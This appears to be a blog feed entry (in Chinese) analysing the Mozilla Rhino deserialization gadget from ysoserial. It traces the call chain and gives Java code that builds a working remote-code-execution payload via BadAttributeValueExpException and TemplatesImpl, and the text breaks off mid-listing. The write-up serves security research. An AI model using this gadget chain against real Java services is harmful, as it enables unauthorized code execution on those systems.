<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>闻道解惑</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.yaowendao.com/"/>
  <updated>2018-06-02T07:34:06.855Z</updated>
  <id>http://www.yaowendao.com/</id>
  
  <author>
    <name>香依香偎</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Mozilla Rhino 反序列化漏洞 POC 分析</title>
    <link href="http://www.yaowendao.com/2018/02/24/Mozilla%20Rhino%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EPOC%E5%88%86%E6%9E%90/"/>
    <id>http://www.yaowendao.com/2018/02/24/Mozilla Rhino反序列化漏洞POC分析/</id>
    <published>2018-02-23T16:00:00.000Z</published>
    <updated>2018-06-02T07:34:06.855Z</updated>
    
    <content type="html"><![CDATA[<p>来源：<a href="https://mp.weixin.qq.com/s/qm3mS78r43IIOHgZ-6YyGw" target="_blank" rel="noopener">香依香偎@闻道解惑</a></p><p><strong>Mozilla Rhino</strong> 是一个完全使用 Java 语言编写的开源 JavaScript 引擎。ysoserial 中收录了 Rhino 的反序列化 Gadget，本篇文章就来分析一下这个 Gadget。</p><h2 id="零、NativeError-的继承关系"><a href="#零、NativeError-的继承关系" class="headerlink" title="零、NativeError 的继承关系"></a>零、NativeError 的继承关系</h2><p>首先来看 <code>org.mozilla.javascript.NativeError</code> 类的继承关系。它继承自 <code>IdScriptableObject</code>，后者继承自 <code>ScriptableObject</code>。而 <code>ScriptableObject</code> 实现了 <code>Scriptable</code> 接口和 <code>Serializable</code> 接口。因此，<code>NativeError</code> 可以进行序列化和反序列化操作。</p><p> <img src="/image/00-class.png" alt="NativeError.class"> </p><h2 id="一、分析"><a href="#一、分析" class="headerlink" title="一、分析"></a>一、分析</h2><p><strong>1、</strong> 首先，反序列化攻击的入口在 <code>NativeError</code> 的 <code>toString()</code> 函数。</p><p> <img src="/image/01-nativeerror.png" alt="NativeError.toString"> </p><p><code>toString()</code> 中调用了 <code>js_toString()</code> 函数，传入参数为 <code>NativeError</code> 的 this 对象。看下<code>js_toString()</code> 。</p><p> <img src="/image/02-js_toString.png" alt="NativeError.js_toString"> </p><p><code>js_toString()</code> 调用了两次 <code>getString()</code> 函数，传入的参数是 <code>NativeError</code> 对象和字符串 name/message，继续跟进。</p><p> <img src="/image/03-getString.png" alt="NativeError.getString"> </p><p><code>getString()</code> 中调用的是父类 <code>ScriptableObject</code> 的 <code>getProperty()</code> 函数，入参没有变化。跟进去看看。</p><p> <img src="/image/04-ScriptableObject.getProperty.png" alt="ScriptableObject.getProperty"> </p><p>其中调用的是 <code>Scriptable</code> 接口的 <code>get()</code> 函数。这个 <code>get()</code> 的实现在 <code>IdScriptableObject</code> 类。</p><p> <img src="/image/05-IdScriptableObject.get.png" alt="IdScriptableObject.get"> </p><p><code>IdScriptableObject.get()</code> 最后调用的是父类 <code>ScriptableObject</code> 的 <code>get()</code> 函数，再次回到 <code>ScriptableObject</code> 类。</p><p> <img src="/image/06-ScriptableObject.get.png" alt="ScriptableObject.get"> </p><p>继续跟进 <code>getImpl()</code> 函数。</p><p> <img src="/image/07-ScriptableObject.getImpl.png" alt="ScriptableObject.getImpl"> </p><p>其中的关键在于 2007 行到 2026 行的这部分。先看 2009 行到 2020 行的第一个分支。</p><p> <img src="/image/08-getImpl-2-branch.png" alt="getImpl-branches.png"> </p><p>这个分支中有 <code>nativeGetter.invoke()</code> 的调用，看上去有戏。但有一个问题在于，<code>nativeGetter.delegateTo</code> 是 <code>transient</code> 变量，在反序列化过程中无法赋值。</p><p> <img src="/image/09-transient-delegateTo.png" alt="transient-delegateTo"> </p><p>这会导致 2013 行 <code>if (nativeError.delegateTo == null)</code> 的判断恒真，<code>getterThis</code> 就被赋值为最初的 <code>NativeError</code> 对象。这就导致 2020 行的 <code>nativeGetter.invoke()</code> 无法调用我们期望的目标对象的函数，只能调用静态函数或者 <code>NativeError</code> 类的内置函数。这当然不是我们期望的结果。</p><p> <img src="/image/10-nativeGetter.invoke.png" alt="nativeGetter.invoke"> </p><p>再来看 2021 行到 2026 行的 <code>else</code> 分支。</p><p> <img src="/image/11-getImpl-branch-2.png" alt="getImpl-else-branch"> </p><p>这个分支中需要将 <code>getterObj</code> 设置为 <code>Function</code> 对象，并最终调用 <code>Function</code> 的 <code>call()</code> 函数。先看看 <code>getterObj</code> 如何赋值。</p><p><img src="/image/62-ScriptableObject-getterObj.png" alt="ScriptableObject-getterObj"></p><p>通过 <code>GetterSlot</code> 的 <code>getter</code>。<code>GetterSlot</code> 是 <code>ScriptableObject</code> 的内部类，支持序列化。</p><p><img src="/image/63-GetterSlot-getter.png" alt="GetterSlot-getter"></p><p><img src="/image/64-GetterSlot-classes.png" alt="GetterSlot-classes"></p><p><code>GetterSlot.getter</code> 可以通过 <code>ScriptableObject.setGetterOrSetter()</code> 来进行赋值。</p><p><img src="/image/65-ScriptableObject-setGetterOrSetter.png" alt="ScriptableObject-setGetterOrSetter"></p><p>那么 <code>getterObj</code> 要赋值成 <code>Function</code> 的哪个对象呢？<code>Function</code> 是个接口，看下它的实现类。</p><p><img src="/image/12-Function-classes.png" alt="Function-classes"></p><p>我们选择 <code>NativeJavaMethod</code> 类。这个类继承自 <code>BaseFunction</code>，后者同样继承自 <code>IdScriptableObject</code>，因此同样可以进行序列化和反序列化处理。</p><p><img src="/image/13-NativeJavaMethod-classes.png" alt="NativeJavaMethod-classes"></p><p><code>NativeJavaMethod.call()</code> 函数挺长，翻一翻会发现在 247 行调用了 <code>meth.invoke(javaObject, args)</code>。</p><p><img src="/image/14-NativeJavaMethod.call.png" alt="NativeJavaMethod.call"></p><p>这个 <code>invoke()</code> 的调用，其实是 <code>MemberBox.invoke()</code> 函数，其中直接调用了我们熟悉的 <code>method.invoke()</code> 函数。</p><p><img src="/image/15-MemberBox.invoke.png" alt="MemberBox.invoke"></p><p>看起来很有希望。为了能成功调用到我们期望的目标函数，我们需要关注 <code>NativeJavaMethod.call()</code> 中 <code>meth.invoke(javaObject, args)</code> 里的三个变量：<code>meth</code>、<code>javaObject</code>和<code>args</code>。</p><p><img src="/image/14-NativeJavaMethod.call.png" alt="NativeJavaMethod.call"></p><p>一个一个来，先看 <code>meth</code>。</p><p><strong>2、</strong><code>meth</code> 的值来自类的成员变量 <code>methods</code>，通过 <code>findFunction()</code> 查找到索引 <code>index</code>。 </p><p><img src="/image/16-NativeJavaMethod-methods.png" alt="NativeJavaMethod.methods"></p><p>成员变量 <code>methods</code> 是 <code>MemberBox</code> 类的对象数组，本身可以通过反序列化赋值。</p><p><img src="/image/61-NativeJavaMethod.methods.png" alt="NativeJavaMethod.methods"></p><p>至于 <code>methods</code> 的内容要设置成什么样，来看下 <code>MemberBox.invoke()</code> 函数。其中 <code>method</code> 来自 <code>method()</code> 函数，而后者是直接返回了 <code>memberObject</code> 变量。</p><p><img src="/image/15-MemberBox.invoke.png" alt="MemberBox.invoke"></p><p><img src="/image/17-MemberBox-method.png" alt="MemberBox-method"></p><p><code>MemberBox.memberObject</code> 是个 transient 变量，要怎么赋值呢？</p><p><img src="/image/18-MemberBox-memberObject.png" alt="MemberBox-memberObject"></p><p>答案就在 <code>MemberBox.readObject()</code> 中。这里先通过 <code>readMember()</code> 得到了 member 对象，再通过 <code>init()</code> 函数将 <code>member</code> 赋值给 <code>memberObject</code>。</p><p><img src="/image/19-MemberBox.readObject.png" alt="MemberBox.readObject"></p><p><img src="/image/20-MemberBox.init.png" alt="MemberBox.init"></p><p>继续跟进 <code>readMember()</code> 函数，就是一个反序列化的实现。因此，通过反序列化给 <code>memberObject</code>的赋值，不存在问题。</p><p><img src="/image/21-MemberBox.readMember.png" alt="MemberBox.readMember"></p><p>也就是说，我们可以通过反序列化给 <code>meth</code> 赋值为期望的目标函数。</p><p><strong>结论</strong></p><p>设置 <code>NativeJavaMethod.call()</code> 中的 <code>meth</code> 需要：</p><ul><li>构造 <code>MemberBox</code> 对象 m</li><li>设置 m 的成员变量 <code>memberObject</code> 为目标函数</li><li>构造 <code>NativeJavaMethod</code> 对象 n</li><li>设置 n 的成员变量 <code>methods</code> 的 0 号元素为 m</li></ul><p><strong>3、</strong> javaObject 涉及的代码，都在 <code>NativeJavaMethod.call()</code> 的 222~247 行。</p><p><img src="/image/22-NativeJavaMethod-javaObject.png" alt="NativeJavaMethod-javaObject"></p><p>关键的部分就是 225~242 行的 <code>else</code> 分支里。</p><p><img src="/image/23-NativeJavaMethod.else.branch.png" alt="NativeJavaMethod.else.branch"></p><p>如果要把 <code>javaObject</code> 赋值为我们期望的对象，就是要在 235 行完成这个赋值。但是这里有一个问题：我们知道 <code>thisObj</code> 就是 <code>NativeError</code> 对象，同理 <code>o</code> 也是。但 <code>NativeError</code> 没有实现 <code>Wrapper</code> 接口，这样一来 234 行的判断条件 <code>if (o instanceof Wrapper)</code> 就不能满足了。</p><p><img src="/image/24-for-o-Wrapper.png" alt="for-o-Wrapper"></p><p>转机在于，这个判断身处循环之中，240 行的 <code>o = o.getPrototype()</code> 给了我们希望。查看一下 <code>Wrapper</code> 的实现类。</p><p><img src="/image/25-Wrapper-classes.png" alt="Wrapper-classes"></p><p>看下 <code>NativeJavaObject</code> 的 <code>unwrap()</code> 函数，直接返回了 <code>NativeJavaObject.javaObject</code> 成员变量。</p><p><img src="/image/26-NativeJavaObject-unwrap.png" alt="NativeJavaObject-unwrap"></p><p>而 <code>NativeJavaObject.javaObject</code> 成员变量可以通过反序列化的 <code>readObject()</code> 函数直接赋值。</p><p><img src="/image/27-NativeJavaObject-readObject.png" alt="NativeJavaObject-readObject"></p><p>也就是说，如果我们让 <code>NativeError</code> 对象的 <code>getPrototype()</code> 返回特定的 <code>NativeJavaObject</code> 对象，就可以完成 <code>javaObject</code> 的赋值。看看 <code>getPrototype()</code> 的实现，在 <code>ScriptableObject</code> 类中。</p><p><img src="/image/28-ScriptableObject-getPrototype.png" alt="ScriptableObject-getPrototype"></p><p>这个 <code>prototypeObject</code> 来自 ScriptableObject 的成员变量，可以通过反序列化赋值。 </p><p><img src="/image/29-ScriptableObject.prototypeObject.png" alt="ScriptableObject.prototypeObject"></p><p><strong>结论</strong></p><p>设置 <code>NativeJavaMethod.call()</code> 中的 <code>javaObject</code> 需要：</p><ul><li>构造 <code>NativeJavaObject</code> 对象 o</li><li>设置 o 的成员变量 <code>javaObject</code> 为目标对象</li><li>构造 <code>NativeError</code> 对象 e</li><li>设置 e 的成员变量 <code>prototypeObject</code> 为 o </li></ul><p><strong>4、</strong> 最后看一下 <code>args</code>。<code>args</code>来自入参，其实就是调用者传入的 <code>ScriptRuntime.emptyArgs</code>。</p><p><img src="/image/30-NativeJavaMethod.args.png" alt="NativeJavaMethod.args"></p><p><img src="/image/31-ScriptableObject.emptyArgs.png" alt="ScriptableObject.emptyArgs"></p><p>这就决定我们要寻找的目标函数，必须是一个<strong>无参函数</strong>。</p><p><strong>5、</strong> 再回到开头，通常反序列化的入口都是 <code>readObject()</code> 函数，而文章开头说 <code>NativeError</code> 的反序列化入口在 <code>toString()</code> 函数。怎么才能从 <code>readObject()</code> 入口转到 <code>NativeError.toString()</code> 呢？</p><p>答案就在 JDK 中的 <code>BadAttributeValueExpException</code> 类的 <code>readObject()</code> 函数。</p><p><img src="/image/32-BadAttributeValueExpException-readObject.png" alt="BadAttributeValueExpException-readObject"></p><p>也就是说，只要将 <code>BadAttributeValueExpException</code> 的 <code>val</code> 设置为 <code>NativeError</code> 对象，就可以在反序列化的过程中调用 <code>NativeError.toString()</code> 了。</p><p><strong>6、结论</strong> </p><p>如果要完成反序列化POC，需要：</p><ul><li>构造 <code>MemberBox</code> 对象 m</li><li>设置 m 的成员变量 <code>memberObject</code> 为目标函数</li><li>构造 <code>NativeJavaMethod</code> 对象 n</li><li>设置 n 的成员变量 <code>methods</code> 的 0 号元素为 m</li><li>构造 <code>NativeJavaObject</code> 对象 o</li><li>设置 o 的成员变量 <code>javaObject</code> 为目标对象</li><li>构造 <code>NativeError</code> 对象 a</li><li>设置 a 的成员变量 <code>prototypeObject</code> 为 o </li><li>通过 a 的 <code>setGetterOrSetter()</code> 函数，设置 a 的 <code>getter</code> 属性为对象 n</li><li>构造 <code>BadAttributeValueExpException</code> 对象 b</li><li>设置 b 的成员变量 <code>val</code> 为 <code>NativeError</code> 对象 a</li></ul><p>前面说过，需要寻找的目标函数，应当是一个无参函数。同时，这个无参函数所属的目标类，还得是实现了 <code>Serializable</code> 接口、支持序列化和反序列化的类。</p><p>因此，首先想到的就是，使用 <code>TemplatesImpl</code> 类作为目标类，使用它的 <code>getOutputProperties()</code> 作为目标函数。</p><h2 id="二、填坑"><a href="#二、填坑" class="headerlink" title="二、填坑"></a>二、填坑</h2><p>完成了上述分析，我们开始写POC。途中暗坑无数，逐一填之。</p><h3 id="1、NativeError-无法实例化"><a href="#1、NativeError-无法实例化" class="headerlink" title="1、NativeError 无法实例化"></a>1、<code>NativeError</code> 无法实例化</h3><p>声明 <code>NativeError</code> 对象，直接报错：<code>The type NativeError is not visible</code>。</p><p><img src="/image/33-Error-NativeError.png" alt="Error-NativeError"></p><p><strong>报错原因：</strong></p><p> <code>NativeError</code> 类不是 <code>public</code>，不能直接引用。</p><p><img src="/image/34-Reason-NativeError.png" alt="Reason-NativeError"></p><p><strong>解决方案：</strong></p><p>通过反射，实例化 <code>NativeError</code> 对象。</p><p><img src="/image/35-Solution-New-NativeError.png" alt="Solution-New-NativeError"></p><h3 id="2、反射实例化的-NativeError-运行失败"><a href="#2、反射实例化的-NativeError-运行失败" class="headerlink" title="2、反射实例化的 NativeError 运行失败"></a>2、反射实例化的 <code>NativeError</code> 运行失败</h3><p>运行这段代码：</p><p><img src="/image/36-Error-Run-new-instance.png" alt="Error-Run-new-instance"></p><p>报错 “ Class com.xiang.rhinotest.RhinoPoc can not access a member of class org.mozilla.javascript.NativeError with modifiers “” ”</p><p><img src="/image/37-Error-Access-NativeError.png" alt="Error-Access-NativeError"></p><p><strong>报错原因：</strong></p><p><code>NativeError</code> 没有提供默认的public 无参构造函数，无法直接调用 newInstance()。</p><p><strong>解决方案：</strong></p><p>通过反射设置构造函数为 public，再进行调用。</p><p><img src="/image/38-Solution-setAccessible.png" alt="Solution-setAccessible"></p><p>反射在 ysoserial 中被大量的使用，原因也就在此。</p><h3 id="3、执行POC失败：No-Context"><a href="#3、执行POC失败：No-Context" class="headerlink" title="3、执行POC失败：No Context"></a>3、执行POC失败：No Context</h3><p>按照“分析”部分的结论，结合大量的反射调用，完成POC如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">generate_Object</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//构造 NativeError 对象 a</span></span><br><span class="line">    Object nativeError;</span><br><span class="line">    &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">"org.mozilla.javascript.NativeError"</span>);</span><br><span class="line">        Constructor&lt;?&gt; cons = cls.getDeclaredConstructor();</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nativeError = cons.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造 NativeJavaObject 对象 o</span></span><br><span class="line">    <span class="comment">//设置 o 的成员变量 javaObject 为目标对象</span></span><br><span class="line">    <span class="comment">//设置 a 的成员变量 prototypeObject 为 o</span></span><br><span class="line">    TemplatesImpl templatesImpl = TemplatesImplGadget.get();</span><br><span class="line">    &#123;</span><br><span class="line">        Context context = Context.enter();</span><br><span class="line">        NativeObject scriptableObject = (NativeObject) context.initStandardObjects();</span><br><span class="line">        NativeJavaObject nativeJavaObject = <span class="keyword">new</span> NativeJavaObject(scriptableObject, templatesImpl, TemplatesImpl.class);</span><br><span class="line">        Method method = nativeError.getClass().getMethod(<span class="string">"setPrototype"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Scriptable.class&#125;);</span><br><span class="line">        method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;nativeJavaObject&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造 MemberBox 对象 m</span></span><br><span class="line">    <span class="comment">//设置 m 的成员变量 memberObject 为目标函数</span></span><br><span class="line">    <span class="comment">//构造 NativeJavaMethod 对象 n</span></span><br><span class="line">    <span class="comment">//设置 n 的成员变量 methods 的 0 号元素为 m   </span></span><br><span class="line">    <span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n</span></span><br><span class="line">    Method getOutputProperties = templatesImpl.getClass().getMethod(<span class="string">"getOutputProperties"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">    &#123; </span><br><span class="line">        NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(getOutputProperties, <span class="keyword">null</span>);</span><br><span class="line">        Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">      method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"name"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//构造 BadAttributeValueExpException 对象 b</span></span><br><span class="line">    <span class="comment">//设置 b 的成员变量 val 为 NativeError 对象 a</span></span><br><span class="line">    BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>); </span><br><span class="line">    &#123;</span><br><span class="line">        Field valField = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valField.set(badAttributeValueExpException, nativeError);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行。呃，序列化成功，可是反序列化的时候却没看到计算器，只看到了报错：“No Context associated with current Thread”。</p><p><img src="/image/39-Error-no-context.png" alt="Error-no-context"></p><p><strong>报错原因：</strong></p><p>问题在哪里呢？就在 <code>ScriptableObject.getImpl()</code> 的 else 分支中。</p><p><img src="/image/40-Reason-no-context.png" alt="Reason-no-context"></p><p>我们期望进入 2024 行的 <code>f.call()</code>，结果在 2023 行 <code>Context.getContext()</code> 抛出了异常，因为 Context 对象为空。</p><p><img src="/image/41-Reason-Context-null.png" alt="Reason-Context-null"></p><p>构造 <code>Context</code> 需要调用 <code>Context.enter()</code> 函数。</p><p><img src="/image/42-Context-enter.png" alt="Context-enter"><br><img src="/image/43-Context-enter-2.png" alt="Context-enter-2"></p><p>怎样在反序列化的时候插入 <code>Context.enter()</code> 的调用呢？</p><p>重新看下调用栈，发现 <code>NativeError.js_toString()</code> 调用了两次 <code>getString()</code> 函数，分别传入字符串 “name”和“message”。</p><p><img src="/image/02-js_toString.png" alt="NativeError.js_toString"> </p><p>因此，我们可以把 <code>TemplatesImpl.getOutputProperties()</code> 作为 “message”的属性，把 <code>Context.enter()</code> 作为 “name” 的属性，这样就可以先执行 <code>Context.enter()</code>，再执行  <code>TemplatesImpl.getOutputProperties()</code> 进行 Payload 执行。</p><p><strong>解决方案：</strong></p><p>按照 POC 中设置 <code>TemplatesImpl.getOutputProperties()</code> 的方法，设置 <code>Context.enter()</code> 为 “name” 属性，将 <code>TemplatesImpl.getOutputProperties()</code> 设置为 “message” 属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造 MemberBox 对象 m</span></span><br><span class="line"><span class="comment">//设置 m 的成员变量 memberObject 为目标函数</span></span><br><span class="line"><span class="comment">//构造 NativeJavaMethod 对象 n</span></span><br><span class="line"><span class="comment">//设置 n 的成员变量 methods 的 0 号元素为 m   </span></span><br><span class="line"><span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n</span></span><br><span class="line">Method getOutputProperties = templatesImpl.getClass().getMethod(<span class="string">"getOutputProperties"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">&#123; </span><br><span class="line">    NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(getOutputProperties, <span class="keyword">null</span>);</span><br><span class="line">    Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">    method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"messsage"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造 MemberBox 对象 m2</span></span><br><span class="line"><span class="comment">//设置 m2 的成员变量 memberObject 为 Context.enter()</span></span><br><span class="line"><span class="comment">//构造 NativeJavaMethod 对象 n2</span></span><br><span class="line"><span class="comment">//设置 n2 的成员变量 methods 的 0 号元素为 m2   </span></span><br><span class="line"><span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n2</span></span><br><span class="line">Method enterMethod = Context.class.getMethod(<span class="string">"enter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">&#123;</span><br><span class="line">    NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(enterMethod, <span class="keyword">null</span>);</span><br><span class="line">    Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">    method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"name"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4、执行POC仍然失败：No-Context"><a href="#4、执行POC仍然失败：No-Context" class="headerlink" title="4、执行POC仍然失败：No Context"></a>4、执行POC仍然失败：No Context</h3><p>增加 <code>Context.enter()</code> 的调用之后，重新运行POC，呃，问题依旧……</p><p><img src="/image/44-Error-no-context.png" alt="Error-no-context"></p><p><strong>报错原因：</strong></p><p>为什么新增的调用无效呢？因为设置函数的方法错了。</p><p>无论是 <code>TemplatesImpl.getOutputProperties()</code> 还是 <code>Context.enter()</code> ，我们都是通过 <code>ScriptableObject.setGetterOrSetter()</code> 函数进行设置。而这个函数设置的 <code>getter</code> 属性，是 <code>Callable</code> 类型的。</p><p><img src="/image/45-ScriptalbeObject-setGetterOrSetter.png" alt="ScriptalbeObject-setGetterOrSetter"></p><p>回到报错的地方看。 2009 行 if 分支的判断条件是，<code>getter</code> 属性的值必须是 <code>MemberBox</code> 类型，而 <code>MemberBox</code> 并没有实现 <code>Callable</code> 接口，所以无论进来的是<code>TemplatesImpl.getOutputProperties()</code> 还是 <code>Context.enter()</code>，代码流程都会走到 2021 行的 else 分支中。</p><p><img src="/image/40-Reason-no-context.png" alt="Reason-no-context"></p><p>我们期望流程走到 2024 行的 <code>f.call()</code>，遇到的问题是在 2023 行就报错了。我们增加 <code>Context.enter()</code> 的调用，期望他能解决无法通过 <code>f.call()</code> 来调用<code>TemplatesImpl.getOutputProperties()</code> 的问题。</p><p>但是对 <code>Context.enter()</code> 的调用遇到了一样的问题，在 2023 行就抛出了异常，无法走到 2024 行去执行我们期望的函数。</p><p>所以，对 <code>Context.enter()</code> 的设置，就不能像 <code>TemplatesImpl.getOutputProperties()</code> 一样，去通过 <code>ScriptableObject.setGetterOrSetter()</code> 函数进行设置，只能让他通过 2009 行的 if 分支去调用。但是要怎么去设置呢？ysoserial 通过反射进行强制设置 <code>getter</code> 属性来解决这个问题。</p><p><strong>解决方案：</strong></p><p>参考 ysoserial 中的方法，通过反射进行强制设置 <code>getter</code> 属性为 MemberBox 对象的 <code>Context.enter()</code> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造 MemberBox 对象 m2</span></span><br><span class="line"><span class="comment">//设置 m2 的成员变量 memberObject 为 Context.enter()</span></span><br><span class="line"><span class="comment">//构造 NativeJavaMethod 对象 n2</span></span><br><span class="line"><span class="comment">//设置 n2 的成员变量 methods 的 0 号元素为 m2   </span></span><br><span class="line"><span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n2</span></span><br><span class="line">Method enterMethod = Context.class.getMethod(<span class="string">"enter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">&#123;</span><br><span class="line">    NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(enterMethod, <span class="keyword">null</span>);</span><br><span class="line">    Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">    method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"name"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过反射强行设置 getter 属性为 MemberBox 对象的 Context.enter() 函数</span></span><br><span class="line">&#123;</span><br><span class="line">    Method getSlot = ScriptableObject.class.getDeclaredMethod(<span class="string">"getSlot"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class&#125;);</span><br><span class="line">    getSlot.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object slot  = getSlot.invoke(nativeError, <span class="string">"name"</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    Field getter = slot.getClass().getDeclaredField(<span class="string">"getter"</span>);</span><br><span class="line">    getter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; memberboxClass = Class.forName(<span class="string">"org.mozilla.javascript.MemberBox"</span>);</span><br><span class="line">    Constructor&lt;?&gt; memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);</span><br><span class="line">    memberboxClassConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);</span><br><span class="line">    getter.set(slot, memberboxes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在再执行 POC，终于可以看到计算器了。</p><p><img src="/image/46-calc.png" alt="calc"></p><h2 id="三、POC"><a href="#三、POC" class="headerlink" title="三、POC"></a>三、POC</h2><p>完整POC参见 <a href="https://github.com/yaojieno1/rhinoPoc" target="_blank" rel="noopener">Github</a>。</p><p>主要函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 